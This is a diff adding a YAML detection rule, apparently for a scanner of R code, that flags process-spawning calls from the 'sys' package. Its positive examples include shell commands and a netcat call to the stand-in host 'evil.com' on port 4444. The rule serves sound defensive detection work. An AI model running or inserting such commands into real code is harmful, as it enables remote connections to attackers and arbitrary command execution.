@@ -1,0 +1,46 @@
+name: system_sys
+version: "0.3.0"
+type: R
+attck:
+  - T1059
+message: >-
+  These sys functions run an external process or fork the R session, which may
+  be used to execute arbitrary shell commands or a second R session outside the
+  visible R source.
+xpath: >-
+  //SYMBOL_FUNCTION_CALL[
+    (
+      text() = 'exec_wait' or text() = 'exec_background'
+      or text() = 'exec_internal' or text() = 'eval_safe'
+      or text() = 'eval_fork' or text() = 'r_background'
+      or text() = 'r_internal' or text() = 'r_wait'
+    )
+    and not(preceding-sibling::OP-DOLLAR)
+    and not(preceding-sibling::OP-AT)
+  ]
+positive_examples:
+  - |
+    sys::exec_wait("sh", c("-c", "id"))
+  - |
+    sys::exec_internal("id")
+  - |
+    exec_background("nc", c("evil.com", "4444"))
+  - |
+    sys::eval_safe(quote(system("id")))
+  - |
+    sys::eval_fork(quote(system("id")))
+  - |
+    sys::r_background(c("-e", "system('id')"))
+  - |
+    sys::r_internal(c("-e", "system('id')"))
+  - |
+    sys::r_wait(c("-e", "system('id')"))
+negative_examples:
+  - |
+    exec(plan)
+  - |
+    foo$exec_wait("x")
+  - |
+    foo@exec_wait("x")
+  - |
+    foo$eval_fork(quote(1))
